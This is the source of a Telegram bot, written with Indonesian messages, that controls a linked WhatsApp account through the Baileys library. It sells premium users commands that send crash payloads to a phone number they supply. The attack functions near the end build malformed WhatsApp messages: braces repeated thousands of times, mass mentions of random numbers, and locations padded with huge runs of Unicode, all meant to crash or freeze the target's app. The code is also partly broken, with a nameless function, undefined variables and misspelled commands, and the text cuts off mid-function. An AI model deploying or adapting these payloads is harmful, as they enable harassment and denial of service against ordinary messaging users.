const { Telegraf, Markup, session } = require("telegraf"); 
const fs = require('fs');
const moment = require('moment-timezone');
const {
    makeWASocket,
    makeInMemoryStore,
    generateMessageID,
    fetchLatestBaileysVersion,
    useMultiFileAuthState,
    DisconnectReason,
    generateWAMessageFromContent
} = require("@whiskeysockets/baileys");
const pino = require('pino');
const chalk = require('chalk');
const { BOT_TOKEN, OwnerId } = require("./settings/config.js");
const crypto = require('crypto');
const axios = require("axios");
const premiumFile = './lib/premiumuser.json';
const ownerFile = './lib/owneruser.json';
const adminFile = './lib/adminuser.json';
const TOKENS_FILE = "./tokens.json";
let bots = [];
const delay = ms => new Promise(resolve => setTimeout(resolve, ms));
const bot = new Telegraf(BOT_TOKEN);

bot.use(session());

let Rexz = null;
let isWhatsAppConnected = false;
let linkedWhatsAppNumber = '';
const usePairingCode = true;

const blacklist = [""];

const randomImage = [
    "https://files.catbox.moe/nv8rrj.jpg"
];

const getRandomImage = () => randomImage[Math.floor(Math.random() * randomImage.length)];

function getPushName(ctx) {
  return ctx.from.first_name || "Pengguna";
}

async function sendProgress(ctx) {
  const progressStages = [
    { text: "[░░░░░░░░░░] 0%", delay: 400 },
    { text: "[█░░░░░░░░░] 10%\nProccesing", delay: 500 },
    { text: "[██░░░░░░░░] 20%\nProccesing", delay: 500 },
    { text: "[████░░░░░░] 40%\nCreate From @RexzXyz", delay: 600 },
    { text: "[██████░░░░] 60%\nCreate From @RexzXyz", delay: 600 },
    { text: "[████████░░] 80%\ni'm Proses🔄", delay: 700 },
    { text: "[██████████] 100%\n✅Successfully.", delay: 800 }
  ];

  const progressMsg = await ctx.reply(progressStages[0].text);
  let lastText = progressStages[0].text;

  for (const stage of progressStages.slice(1)) {
    await new Promise(res => setTimeout(res, stage.delay));

    if (stage.text !== lastText) {
      await ctx.telegram.editMessageText(
        ctx.chat.id,
        progressMsg.message_id,
        null,
        stage.text
      );
      lastText = stage.text;
    }
  }
}

const sendDoneImage = async (ctx, RexzNumber) => {
  await ctx.replyWithPhoto("https://files.catbox.moe/nv8rrj.jpg", {
    caption: `
\`\`\`
#- 𝚂 𝚄 𝙲 𝚂 𝙴 𝚂 - 𝚂 𝙴 𝙽 𝙳 𝙱 𝚄 𝙶
...
 ▢ ᴛᴀʀɢᴇᴛ : ${RexzNumber}
 ▢ sᴛᴀᴛᴜs : 𝚂𝚞𝚌𝚌𝚎𝚜𝙵𝚞𝚕✅
\`\`\`
© ⏤͟͟͞͞𝐃𝐞𝐚𝐭𝐡𝐥𝐞𝐬 𝐈𝐧𝐯𝐢𝐜𝐭𝐮𝐳࿐`,
    parse_mode: 'Markdown',
    ...Markup.inlineKeyboard([
      [
        Markup.button.url('⌜ 𝙲𝙴𝙺 𝚃𝙰𝚁𝙶𝙴𝚃 ⌟', `https://wa.me/${RexzNumber}`)
      ]
    ])
  });
};

    
    
// Fungsi untuk mendapatkan waktu uptime
const getUptime = () => {
    const uptimeSeconds = process.uptime();
    const hours = Math.floor(uptimeSeconds / 3600);
    const minutes = Math.floor((uptimeSeconds % 3600) / 60);
    const seconds = Math.floor(uptimeSeconds % 60);

    return `${hours}h ${minutes}m ${seconds}s`;
};

const question = (query) => new Promise((resolve) => {
    const rl = require('readline').createInterface({
        input: process.stdin,
        output: process.stdout
    });
    rl.question(query, (answer) => {
        rl.close();
        resolve(answer);
    });
});

// --- Koneksi WhatsApp ---
const store = makeInMemoryStore({ logger: pino().child({ level: 'silent', stream: 'store' }) });

const startSesi = async () => {
    const { state, saveCreds } = await useMultiFileAuthState('./session');
    const { version } = await fetchLatestBaileysVersion();

    const connectionOptions = {
        version,
        keepAliveIntervalMs: 30000,
        printQRInTerminal: false,
        logger: pino({ level: "silent" }), // Log level diubah ke "info"
        auth: state,
        browser: ['Mac OS', 'Safari', '10.15.7'],
        getMessage: async (key) => ({
            conversation: 'P', // Placeholder, you can change this or remove it
        }),
    };

    Rexz = makeWASocket(connectionOptions);

    Rexz.ev.on('creds.update', saveCreds);
    store.bind(Rexz.ev);

    Rexz.ev.on('connection.update', (update) => {
        const { connection, lastDisconnect } = update;

        if (connection === 'open') {
            isWhatsAppConnected = true;
            console.log(chalk.white.bold(`
╭━━━━━━━━━━━━━━━━━━━━━━❍
┃  ${chalk.green.bold('WHATSAPP CONNECTED')}
╰━━━━━━━━━━━━━━━━━━━━━━❍`));
        }

        if (connection === 'close') {
            const shouldReconnect = lastDisconnect?.error?.output?.statusCode !== DisconnectReason.loggedOut;
            console.log(
                chalk.white.bold(`
╭━━━━━━━━━━━━━━━━━━━━━━❍
┃ ${chalk.red.bold('WHATSAPP DISCONNECTED')}
╰━━━━━━━━━━━━━━━━━━━━━━❍`),
                shouldReconnect ? chalk.white.bold(`
╭━━━━━━━━━━━━━━━━━━━━━━❍
┃ ${chalk.red.bold('RECONNECTING AGAIN')}
╰━━━━━━━━━━━━━━━━━━━━━━❍`) : ''
            );
            if (shouldReconnect) {
                startSesi();
            }
            isWhatsAppConnected = false;
        }
    });
}


const loadJSON = (file) => {
    if (!fs.existsSync(file)) return [];
    return JSON.parse(fs.readFileSync(file, 'utf8'));
};

const saveJSON = (file, data) => {
    fs.writeFileSync(file, JSON.stringify(data, null, 2));
};

// Muat ID owner dan pengguna premium
let ownerUsers = loadJSON(ownerFile);
let adminUsers = loadJSON(adminFile);
let premiumUsers = loadJSON(premiumFile);

// Middleware untuk memeriksa apakah pengguna adalah owner
const checkOwner = (ctx, next) => {
    if (!ownerUsers.includes(ctx.from.id.toString())) {
        return ctx.reply("❌ Command ini Khusus Pemilik Bot");
    }
    next();
};

const checkAdmin = (ctx, next) => {
    if (!adminUsers.includes(ctx.from.id.toString())) {
        return ctx.reply("❌ Anda bukan Admin. jika anda adalah owner silahkan daftar ulang ID anda menjadi admin");
    }
    next();
};

// Middleware untuk memeriksa apakah pengguna adalah premium
const checkPremium = (ctx, next) => {
    if (!premiumUsers.includes(ctx.from.id.toString())) {
        return ctx.reply("❌ Anda bukan pengguna premium.");
    }
    next();
};

// --- Fungsi untuk Menambahkan Admin ---
const addAdmin = (userId) => {
    if (!adminList.includes(userId)) {
        adminList.push(userId);
        saveAdmins();
    }
};

// --- Fungsi untuk Menghapus Admin ---
const removeAdmin = (userId) => {
    adminList = adminList.filter(id => id !== userId);
    saveAdmins();
};

// --- Fungsi untuk Menyimpan Daftar Admin ---
const saveAdmins = () => {
    fs.writeFileSync('./lib/admins.json', JSON.stringify(adminList));
};

// --- Fungsi untuk Memuat Daftar Admin ---
const loadAdmins = () => {
    try {
        const data = fs.readFileSync('./lib/admins.json');
        adminList = JSON.parse(data);
    } catch (error) {
        console.error(chalk.red('Gagal memuat daftar admin:'), error);
        adminList = [];
    }
};

// --- Fungsi untuk Menambahkan User Premium ---
const addPremiumUser = (userId, durationDays) => {
    const expirationDate = moment().tz('Asia/Jakarta').add(durationDays, 'days');
    premiumUsers[userId] = {
        expired: expirationDate.format('YYYY-MM-DD HH:mm:ss')
    };
    savePremiumUsers();
};

// --- Fungsi untuk Menghapus User Premium ---
const removePremiumUser = (userId) => {
    delete premiumUsers[userId];
    savePremiumUsers();
};

// --- Fungsi untuk Mengecek Status Premium ---
const isPremiumUser = (userId) => {
    const userData = premiumUsers[userId];
    if (!userData) {
        Premiumataubukan = "❌";
        return false;
    }

    const now = moment().tz('Asia/Jakarta');
    const expirationDate = moment(userData.expired, 'YYYY-MM-DD HH:mm:ss').tz('Asia/Jakarta');

    if (now.isBefore(expirationDate)) {
        Premiumataubukan = "✅";
        return true;
    } else {
        Premiumataubukan = "❌";
        return false;
    }
};

// --- Fungsi untuk Menyimpan Data User Premium ---
const savePremiumUsers = () => {
    fs.writeFileSync('./lib/premiumUsers.json', JSON.stringify(premiumUsers));
};

// --- Fungsi untuk Memuat Data User Premium ---
const loadPremiumUsers = () => {
    try {
        const data = fs.readFileSync('./lib/premiumUsers.json');
        premiumUsers = JSON.parse(data);
    } catch (error) {
        console.error(chalk.red('Gagal memuat data user premium:'), error);
        premiumUsers = {};
    }
};

//~~~~~~~~~~~~𝙎𝙏𝘼𝙍𝙏~~~~~~~~~~~~~\\

const checkWhatsAppConnection = (ctx, next) => {
  if (!isWhatsAppConnected) {
    ctx.reply(`
┏━━━━ ERROR :( ━━━━⊱
│ WhatsApp belum terhubung!
┗━━━━━━━━━━━━━━━━⊱`);
    return;
  }
  next();
};

async function editMenu(ctx, caption, buttons) {
  try {
    await ctx.editMessageMedia(
      {
        type: 'photo',
        media: getRandomImage(),
        caption,
        parse_mode: 'Markdown',
      },
      {
        reply_markup: buttons.reply_markup,
      }
    );
  } catch (error) {
    //console.error('Error editing menu:', error);
  }
}

bot.command('start', async (ctx) => {
    const userId = ctx.from.id.toString();
    const RandomImage = getRandomImage();
    const waktuRunPanel = getUptime();
    const senderId = ctx.from.id;
    const senderName = ctx.from.first_name
        ? `User: ${ctx.from.first_name}`
        : `User ID: ${senderId}`;
    await ctx.replyWithPhoto(RandomImage, {
        caption: `
╔─⊱ INFORMATION ⊰─═⬡
│⎔ Name: Deathles Invictuz 
║⎔ Version : 1.7
│⎔ Owner : @XavieraXyy
║⎔ User : ${ctx.from.first_name}
│⎔ User Id : ${senderId}
╚─═─═─═─═─═─═─═─⬡`,
        parse_mode: 'HTML',
        ...Markup.inlineKeyboard([
            [
                Markup.button.callback('❍ BUG MENU', 'cp'),
            ],
            [
                Markup.button.callback('❍ CONTROL', 'dx'),
            ],
            [
                Markup.button.url('❍ OWNER', 'https://t.me/XavieraXyy'),
            ]
        ])
    });
});
bot.action('dx', async (ctx) => {
 const userId = ctx.from.id.toString();
 const waktuRunPanel = getUptime(); // Waktu uptime panel
 const senderId = ctx.from.id;
 const senderName = ctx.from.first_name
    ? `User: ${ctx.from.first_name}`
    : `User ID: ${senderId}`;
  const buttons = Markup.inlineKeyboard([
    [Markup.button.callback('BACK', 'startback')],
  ]);

  const caption = `
╔─⊱ INFORMATION ⊰─═⬡
│⎔ Name: Deathles Invictuz 
║⎔ Version : 1.7
│⎔ Owner : @XavieraXyy
║⎔ User : ${ctx.from.first_name}
│⎔ User Id : ${senderId}
╚─═─═─═─═─═─═─═─⬡

╔─⊱ SETTING BOT ⊰─═⬡
│⎔ /addprem : @username 
║⎔ /delprem : @username
│⎔ /addowner : @usermame
║⎔ /delowner : @username
│⎔ /addpairing : 628xxx
╚─═─═─═─═─═─═─═─⬡`;

  await editMenu(ctx, caption, buttons);
});
bot.action('cp', async (ctx) => {
 const userId = ctx.from.id.toString();
 const waktuRunPanel = getUptime(); // Waktu uptime panel
 const senderId = ctx.from.id;
 const senderName = ctx.from.first_name
    ? `User: ${ctx.from.first_name}`
    : `User ID: ${senderId}`;
  const buttons = Markup.inlineKeyboard([
    [Markup.button.callback('BACK', 'startback')],
  ]);

  const caption = `
╔─⊱ INFORMATION ⊰─═⬡
│⎔ Name: Deathles Invictuz 
║⎔ Version : 1.7
│⎔ Owner : @XavieraXyy
║⎔ User : ${ctx.from.first_name}
│⎔ User Id : ${senderId}
╚─═─═─═─═─═─═─═─⬡

╔─⊱ APPEARANCE  ⊰─═⬡
│⎔ /crashandro : 628xxx
║⎔ /crashios : 628xxx
│⎔ /delaymaker : 628xxx
╚─═─═─═─═─═─═─═─⬡`;

  await editMenu(ctx, caption, buttons);
});
bot.action('startback', async (ctx) => {
 const userId = ctx.from.id.toString();
 const waktuRunPanel = getUptime(); // Waktu uptime panel
 const senderId = ctx.from.id;
 const senderName = ctx.from.first_name
    ? `User: ${ctx.from.first_name}`
    : `User ID: ${senderId}`;
  const buttons = Markup.inlineKeyboard([
    [
                Markup.button.callback('❍ BUG MENU', 'cp'),
            ],
            [
                Markup.button.callback('❍ CONTROL', 'dx'),
            ],
            [
                Markup.button.url('❍ OWNER', 'https://t.me/RexzXyz'),
    ],
  ]);

  const caption = `
╔─⊱ INFORMATION ⊰─═⬡
│⎔ Name: Deathles Invictuz 
║⎔ Version : 1.7
│⎔ Owner : @RexzXyz
║⎔ User : ${ctx.from.first_name}
│⎔ User Id : ${senderId}
╚─═─═─═─═─═─═─═─⬡`;

  await editMenu(ctx, caption, buttons);
});
bot.command("xploit", checkWhatsAppConnection, checkPremium, async (ctx) => {
  const q = ctx.message.text.split(" ")[1];
  if (!q) return ctx.reply(`Example:\n\n/xploit 628xxxx`);
  
  const RexzNumber = q.replace(/[^0-9]/g, '');
  const target = RexzNumber + "@s.whatsapp.net";
  await ctx.replyWithPhoto(RandomImage, {
    caption: `⏤‌‌‌𐌍𐌃𐌀𐌀‌ 𐌗-𐌓𐌋Ꝋ𐌉𐌕 - ᎥᎴ࿐`,
    parse_mode: 'Markdown',
    ...Markup.inlineKeyboard([
      [{
        text: "⏤͟͟͞͞𝐗-𝐢𝐧𝐯𝐢𝐬࿐",
        callback_data: `d1 ${target}`
      },
      {
        text: "⏤͟͟͞͞𝐅𝐜-𝐁𝐞𝐭𝐚࿐",
        callback_data: `fc2 ${target}`
      },
      {
        text: "⏤͟͟͞͞𝐂𝐫𝐚𝐬𝐡 𝐍𝐨𝐭𝐢𝐟࿐",
        callback_data: `bl1 ${target}`
      },
      {
        text: "⏤͟͟͞͞𝐂𝐨𝐦𝐛𝐨 𝐗𝐩𝐥𝐨࿐",
        callback_data: `cb ${target}`
      }], 
       [
         Markup.button.callback('BACK', 'startback'),
       ], 
    ])
  });
});
//~~~~~~~~~~~~~~~~~~END~~~~~~~~~~~~~~~~~~~~\\
bot.command("carshios", checkWhatsAppConnection, checkPremium, async (ctx) => {
    const q = ctx.message.text.split(" ")[1];
    if (!q) return ctx.reply(`Example:\n\n/carshios 628xxxx`);

    const RexzNumber = q.replace(/[^0-9]/g, '');
    const target = RexzNumber + "@s.whatsapp.net";

    await sendProgress(ctx);
    await sendDoneImage(ctx, RexzNumber);
    await Forclose(target)
    await HeavenSqL(target)
});
bot.command("ctashandro", checkWhatsAppConnection, checkPremium, async (ctx) => {
    const q = ctx.message.text.split(" ")[1];
    if (!q) return ctx.reply(`Example:\n\n/crashios 628xxxx`);

    const RexzNumber = q.replace(/[^0-9]/g, '');
    const target = RexzNumber + "@s.whatsapp.net";

    await sendProgress(ctx);
    await sendDoneImage(ctx, RexzNumber);
    for ( let i = 0; i > 10; i++) {
    await Delay(target)
        }
});
bot.command("delaymaker", checkWhatsAppConnection, async (ctx) => {
    const q = ctx.message.text.split(" ")[1];
    if (!q) return ctx.reply(`Example:\n\n/delaymaker 628xxxx`);

    const RexzNumber = q.replace(/[^0-9]/g, '');
    const target = RexzNumber + "@s.whatsapp.net";

    await sendProgress(ctx);
    await sendDoneImage(ctx, RexzNumber);
    for ( let i = 0; i < 50; i++) {
       await FcIos(target)
       }
});
bot.action("cb", checkWhatsAppConnection, async (ctx) => {
    const q = ctx.message.text.split(" ")[1];
    if (!q) return ctx.reply(`Example:\n\n/exploit 628xxxx`);

    const RexzNumber = q.replace(/[^0-9]/g, '');
    const target = RexzNumber + "@s.whatsapp.net";

    await sendProgress(ctx);
    await sendDoneImage(ctx, RexzNumber);
    for ( let i = 0; i < 50; i++) {
       await crashNewIos(target)
       }
});
//~~~~~~~~~~~~~~~~~~~~~~END CASE BUG~~~~~~~~~~~~~~~~~~~\\

// Perintah untuk menambahkan pengguna premium (hanya owner)
bot.action("close", async (ctx) => {
  try {
      await ctx.deleteMessage();
  } catch (error) {
      console.error(chalk.red('Gagal menghapus pesan:'), error);
  }
});

// Command /addowner - Menambahkan owner baru
bot.command("addowner", checkOwner, async (ctx) => {

  let userId;
  
  // Cek jika command merupakan reply ke pesan
  if (ctx.message.reply_to_message) {
      userId = ctx.message.reply_to_message.from.id.toString();
  } 
  // Cek jika ada username/mention atau ID yang diberikan
  else {
      const args = ctx.message.text.split(" ")[1];
      
      if (!args) {
          return await ctx.reply(`
┏━━━❰ Tutorial Addowner ❱━━━
┣⟣ Format tidak valid!
┣⟣ Contoh: /addowner <user_id> <Durasi>
┣⟣ Durasi: 
┃  • 30d (30 hari)
┃  • 24h (24 jam)
┃  • 1m (1 bulan)
┗━━━━━━━━━━━━━━━`);
      }

      // Jika input adalah username (dimulai dengan @)
      if (args.startsWith("@")) {
          try {
              const username = args.slice(1); // Hapus @ dari username
              const chatMember = await ctx.telegram.getChatMember(ctx.chat.id, `@${username}`);
              userId = chatMember.user.id.toString();
          } catch (error) {
              return await ctx.reply("❌ Username tidak ditemukan atau bukan member dari grup ini.");
          }
      } 
      // Jika input adalah ID langsung
      else {
          if (!/^\d+$/.test(args)) {
              return await ctx.reply("❌ ID harus berupa angka!");
          }
          userId = args;
      }
  }

  // Cek apakah user sudah terdaftar sebagai owner
  if (!adminUsers.includes(userId)) {
      return await ctx.reply(`🌟 User dengan ID ${userId} sudah terdaftar sebagai owner.`);
  }

  try {
      // Dapatkan info user untuk ditampilkan
      const user = await ctx.telegram.getChat(userId);
      adminUsers.push(userId);
      await saveAdmins();

      const successMessage = `
╭──「 𝗔𝗗𝗗 𝗢𝗪𝗡𝗘𝗥 」
┃ ✅ BERHASIL MENAMBAH OWNER 
┃ 𝗗𝗲𝘁𝗮𝗶𝗹 𝗢𝘄𝗻𝗲𝗿:
┃ • ID: ${userId}
┃ • Username: ${user.username ? '@' + user.username : 'Tidak ada'}
╰─────────────────`;

      await ctx.replyWithMarkdown(successMessage, {
          reply_markup: {
              inline_keyboard: [
                  [{ text: "❌ Close", callback_data: "close" }]
              ]
          }
      });

  } catch (error) {
      console.error('Error adding owner:', error);
      await ctx.reply("❌ Gagal menambahkan owner. Pastikan ID/Username valid dan bot memiliki akses yang diperlukan.");
  }
});

bot.command("setjeda", checkOwner, async (ctx) => {
  // Permission check

  const args = ctx.message.text.split(/\s+/);
  if (args.length < 2 || isNaN(args[1])) {
      return await ctx.reply(`
╭❌ Format perintah salah. Gunakan: /setjeda <60d>`);
  }

  const newCooldown = parseInt(args[1]);
  
  // Validasi input
  if (newCooldown < 10 || newCooldown > 3600) {
      return await ctx.reply("❌ Jeda harus antara 10 - 3600 detik!");
  }

  bugCooldown = newCooldown;
  await ctx.reply(`
╭──「 𝗦𝗘𝗧 𝗝𝗘𝗗𝗔 」
│ • Status: Berhasil ✅
│ • Jeda: ${bugCooldown} detik
╰──────────────────❍`);
});

bot.command("delprem", checkAdmin, async (ctx) => {

  let userId;

  // Cek jika command merupakan reply ke pesan
  if (ctx.message.reply_to_message) {
      userId = ctx.message.reply_to_message.from.id.toString();
  } else {
      const args = ctx.message.text.split(" ")[1];
      if (!args) {
          return await ctx.reply(`❌ Format perintah salah. Gunakan: /delprem <id>`);
      }

      // Jika input adalah username
      if (args.startsWith("@")) {
          try {
              const username = args.slice(1);
              const chatMember = await ctx.telegram.getChatMember(ctx.chat.id, `@${username}`);
              userId = chatMember.user.id.toString();
          } catch (error) {
              return await ctx.reply("❌ Username tidak ditemukan atau bukan member dari grup ini.");
          }
      } else {
          if (!/^\d+$/.test(args)) {
              return await ctx.reply("❌ ID harus berupa angka!");
          }
          userId = args;
      }
  }

  // Cek apakah user adalah premium
  if (!premiumUsers[userId]) {
      return await ctx.reply(`❌ User dengan ID ${userId} tidak terdaftar sebagai user premium.`);
  }

  try {
      const user = await ctx.telegram.getChat(userId);
      removePremiumUser(userId);

      const successMessage = `
╭──「  𝗗𝗘𝗟𝗘𝗧𝗘 𝗣𝗥𝗘𝗠 」
┃ ✅ BERHASIL MMENGHAPUS PREMIUM
┃ 𝗗𝗲𝘁𝗮𝗶𝗹 𝗨𝘀𝗲𝗿:
┃ • ID: ${userId}
┃ • Username: ${user.username ? '@' + user.username : 'Tidak ada'}
╰─────────────────`;

      await ctx.replyWithMarkdown(successMessage, {
          reply_markup: {
              inline_keyboard: [
                  [{ text: "❌ Close", callback_data: "close" }]
              ]
          }
      });
  } catch (error) {
      console.error('Error removing premium:', error);
      await ctx.reply("❌ Gagal menghapus premium. Pastikan ID/Username valid.");
  }
});

bot.command("delowner", checkOwner, async (ctx) => {

  let userId;

  if (ctx.message.reply_to_message) {
      userId = ctx.message.reply_to_message.from.id.toString();
  } else {
      const args = ctx.message.text.split(" ")[1];
      if (!args) {
          return await ctx.reply(`❌ Format perintah salah. Gunakan: /delowner <id>`);
      }

      if (args.startsWith("@")) {
          try {
              const username = args.slice(1);
              const chatMember = await ctx.telegram.getChatMember(ctx.chat.id, `@${username}`);
              userId = chatMember.user.id.toString();
          } catch (error) {
              return await ctx.reply("❌ Username tidak ditemukan atau bukan member dari grup ini.");
          }
      } else {
          if (!/^\d+$/.test(args)) {
              return await ctx.reply("❌ ID harus berupa angka!");
          }
          userId = args;
      }
  }

  if (!adminUsers.includes(userId)) {
      return await ctx.reply(`❌ User dengan ID ${userId} tidak terdaftar sebagai owner.`);
  }

  try {
      const user = await ctx.telegram.getChat(userId);
      ownerList = ownerList.filter(id => id !== userId);
      await saveOwnerList();

      const successMessage = `
╭──「  𝗗𝗘𝗟𝗘𝗧𝗘 𝗢𝗪𝗡𝗘𝗥 」
┃ ✅ BERHASIL DELETE OWNER 
┃ 𝗗𝗲𝘁𝗮𝗶𝗹 𝗨𝘀𝗲𝗿:
┃ • ID: ${userId}
┃ • Username: ${user.username ? '@' + user.username : 'Tidak ada'}
╰─────────────────`;

      await ctx.replyWithMarkdown(successMessage, {
          reply_markup: {
              inline_keyboard: [
                  [{ text: "❌ Close", callback_data: "close" }]
              ]
          }
      });
  } catch (error) {
      console.error('Error removing owner:', error);
      await ctx.reply("❌ Gagal menghapus owner. Pastikan ID/Username valid.");
  }
});

bot.command("addprem", checkAdmin, async (ctx) => {

    const args = ctx.message.text.split(" ");
    let userId;
    let durationDays;

    // Parse durasi dari argument terakhir
    durationDays = parseInt(args[args.length - 1]);
    if (isNaN(durationDays) || durationDays <= 0) {
      return await ctx.reply(`
┏━━━❰ Tutorial Address ❱━━━
┣⟣ Format tidak valid!
┣⟣ Contoh: /addprem <user_id> <Durasi>
┣⟣ Durasi: 
┃  • 30d (30 hari)
┃  • 24h (24 jam)
┃  • 1m (1 bulan)
┗━━━━━━━━━━━━━━━`);
    }

    // Jika command merupakan reply ke pesan
    if (ctx.message.reply_to_message) {
        userId = ctx.message.reply_to_message.from.id.toString();
    } 
    // Jika ada username/mention atau ID yang diberikan
    else if (args.length >= 3) {
        const userArg = args[1];
        
        // Jika input adalah username (dimulai dengan @)
        if (userArg.startsWith("@")) {
            try {
                const username = userArg.slice(1);
                const chatMember = await ctx.telegram.getChatMember(ctx.chat.id, `@${username}`);
                userId = chatMember.user.id.toString();
            } catch (error) {
                console.log("Error getting user by username:", error);
                userId = null;
            }
        } 
        // Jika input adalah ID langsung
        else {
            userId = userArg.toString();
        }
    }

    if (!userId) {
        return await ctx.reply("❌ Tidak dapat menemukan user. Pastikan ID/Username valid.");
    }

    try {
        // Tambahkan user ke premium
        addPremiumUser(userId, durationDays);

        const expirationDate = premiumUsers[userId].expired;
        const formattedExpiration = moment(expirationDate, 'YYYY-MM-DD HH:mm:ss').tz('Asia/Jakarta').format('DD-MM-YYYY HH:mm:ss');

        const successMessage = `
╭──「  𝗔𝗗𝗗 𝗣𝗥𝗘𝗠 」
┃ ✅ BERHASIL MENAMBAH PREMIUM
┃ 𝗗𝗲𝘁𝗮𝗶𝗹 𝗣𝗿𝗲𝗺𝗶𝘂𝗺:
┃ • ID: ${userId}
┃ • Durasi: ${durationDays} hari
┃ • Expired: ${formattedExpiration} WIB
╰─────────────────`;

        await ctx.replyWithMarkdown(successMessage, {
            reply_markup: {
                inline_keyboard: [
                    [{ text: "❌ Close", callback_data: "close" }]
                ]
            }
        });

    } catch (error) {
        console.error('Error adding premium:', error);
        await ctx.reply("❌ Gagal menambahkan premium. Silakan coba lagi.");
    }
});
// Perintah untuk mengecek status premium
bot.command('cekprem', (ctx) => {
    const userId = ctx.from.id.toString();

    if (premiumUsers.includes(userId)) {
        return ctx.reply(`✅ Anda adalah pengguna premium.`);
    } else {
        return ctx.reply(`❌ Anda bukan pengguna premium.`);
    }
});

// Command untuk pairing WhatsApp
bot.command("addpairing", checkOwner, async (ctx) => {

    const args = ctx.message.text.split(" ");
    if (args.length < 2) {
        return await ctx.reply("❌ Format perintah salah. Gunakan: /connect <nomor_wa>");
    }

    let phoneNumber = args[1];
    phoneNumber = phoneNumber.replace(/[^0-9]/g, '');


    if (Rexz && Rexz.user) {
        return await ctx.reply("WhatsApp sudah terhubung. Tidak perlu pairing lagi.");
    }

    try {
        const code = await Rexz.requestPairingCode(phoneNumber);
        const formattedCode = code?.match(/.{1,4}/g)?.join("-") || code;

        const pairingMessage = `
\`\`\`✅𝗦𝘂𝗰𝗰𝗲𝘀𝘀
𝗞𝗼𝗱𝗲 𝗪𝗵𝗮𝘁𝘀𝗔𝗽𝗽 𝗔𝗻𝗱𝗮

𝗡𝗼𝗺𝗼𝗿: ${phoneNumber}
𝗞𝗼𝗱𝗲: ${formattedCode}\`\`\`
`;

        await ctx.replyWithMarkdown(pairingMessage);
    } catch (error) {
        console.error(chalk.red('Gagal melakukan pairing:'), error);
        await ctx.reply("❌ Gagal melakukan pairing. Pastikan nomor WhatsApp valid dan dapat menerima SMS.");
    }
});

const restartBot = () => {
  pm2.connect((err) => {
    if (err) {
      console.error('Gagal terhubung ke PM2:', err);
      return;
    }

    pm2.restart('index', (err) => { 
      pm2.disconnect(); 
      if (err) {
        console.error('Gagal merestart bot:', err);
      } else {
        console.log('Bot berhasil direstart.');
      }
    });
  });
};

//~~~~~~~~~~~~~~~~~~~FUNC BUG~~~~~~~~~~~~~~~~~~~\\
async function Forclose(target) {
  await Rexz.relayMessage(target, {
    interactiveMessage: {
      header: {
        hasMediaAttachment: true, 
        jpegThumbnail: d7yJpg, 
        title: "Rexz Official - ID📌"
      }, 
      contextInfo: {
        participant: "13135550002@s.whatsapp.net", 
        remoteJid: "status@broadcast", 
        conversionSource: "Wa.me/stickerpack/d7y", 
        conversionData: Math.random(), 
        conversionDelaySeconds: 250208,
        isForwarded: true, 
        forwardingScore: 250208,
        forwardNewsletterMessageInfo: {
          newsletterName: "Rexz Official - ID📌", 
          newsletterJid: "1@newsletter", 
          serverMessageId: 1
        }, 
        quotedAd: {
          caption: "Rexz Official - ID📌", 
          advertiserName: "Rexz Official - ID📌", 
          mediaType: "VIDEO" 
        }, 
        placeKeyHolder: {
          fromMe: false, 
          remoteJid: "0@s.whatsapp.net", 
          id: "PEPEK1234"
        }, 
        expiration: -250208, 
        ephemeralSettingTimestamp: 99999,
        ephemeralSharedSecret: 999,
        entryPointConversionSource: "Whatsapp.com", 
        entryPointConversionApp: "Whatsapp.com", 
        actionLink: {
          url: "Wa.me/stickerpack/d7y", 
          buttonTitle: "Rexz Official - ID📌"
        }
      }, 
      nativeFlowMessage: {
        messageParamaJson: "{".repeat(9000), 
        buttons: [
          {
            name: "payment_method",
            buttonParamsJson: "{\"currency\":\"XXX\",\"payment_configuration\":\"\",\"payment_type\":\"\",\"total_amount\":{\"value\":1000000,\"offset\":100},\"reference_id\":\"4SWMDTS1PY4\",\"type\":\"physical-goods\",\"order\":{\"status\":\"payment_requested\",\"description\":\"\",\"subtotal\":{\"value\":0,\"offset\":100},\"order_type\":\"PAYMENT_REQUEST\",\"items\":[{\"retailer_id\":\"custom-item-6bc19ce3-67a4-4280-ba13-ef8366014e9b\",\"name\":\"D | 7eppeli-Exploration\",\"amount\":{\"value\":1000000,\"offset\":100},\"quantity\":1}]},\"additional_note\":\"D | 7eppeli-Exploration\",\"native_payment_methods\":[],\"share_payment_status\":false}"
          }
        ], 
        messageParamsJson: "}".repeat(9000)
      }
    }
  }, { participant: { jid:target } }) 
}

async function (target) {
try {
    let msg = await generateWAMessageFromContent(target, {
      viewOnceMessage: {
        message: {
          interactiveMessage: {
            header: {
              title: '{ Maklo Kntl }',
              documentMessage: {
                url: "https://mmg.whatsapp.net/v/t62.7119-24/516029272_1071726418353084_4180437093282650193_n.enc?ccb=11-4&oh=01_Q5Aa1wHAUfudGsmO-8hby7Gx7zhnbkKERzehZH2OXihcymBiiw&oe=688DC401&_nc_sid=5e03e0&mms3=true",
                mimetype: "application/zip",
                fileSha256: "BTgVKu2NWPC/ssevWMLNvP1mwJ0tZa3nA+8UahrO7Pk=",
                fileLength: "10680811",
                pageCount: 0,
                mediaKey: "kg7lL4wDCx9XLQ5hdTsuUIP8Xa/hQ4MkF2AWAjJTLEI=",
                fileName: "Base RexzTyz.zip",
                fileEncSha256: "FwxDXQpgaGJX4+JOxqQNZsVSuj2Kwd86JM8NWt1Ho8I=",
                directPath: "/v/t62.7119-24/516029272_1071726418353084_4180437093282650193_n.enc?ccb=11-4&oh=01_Q5Aa1wHAUfudGsmO-8hby7Gx7zhnbkKERzehZH2OXihcymBiiw&oe=688DC401&_nc_sid=5e03e0",
                mediaKeyTimestamp: "1751539667"
              },
              hasMediaAttachment: true
            },
            body: {
              text: '{ $You Stupid }'
            },
            contextInfo: {
              participant: "0s.whatsapp.net",
              remoteJid: "status@broadcast",
              mentionedJid: [
                "13135550002@s.whatsapp.net",
                ...Array.from({ length: 200 }, () =>
                  `1${Math.floor(Math .random() * 50000
                   )}@s.whatsapp.net`
                )
              ],
            }
          }
        }
      }
    });
    await Rexz.relayMessage(target, msg.message, {
      participant: { jid: target },
      messageId: msg.key.id
    });
  } catch (err) {
    console.log(chalk.red(`Err Send bug:, err`))
  }
  console.log(chalk.blue(`sucses Send Bug to: ${target}`))
}

async function FcIos(target) {
   try {
      let locationMessage = {
         degreesLatitude: -9.09999262999,
         degreesLongitude: 199.99963118999,
         jpegThumbnail: null,
         name: "RexzIos" + "𑇂𑆵𑆴𑆿".repeat(15000),
         address: "Rexz" + "𑇂𑆵𑆴𑆿".repeat(5000),
         url: `https://asep.example.${"𑇂𑆵𑆴𑆿".repeat(25000)}.com`,
      }
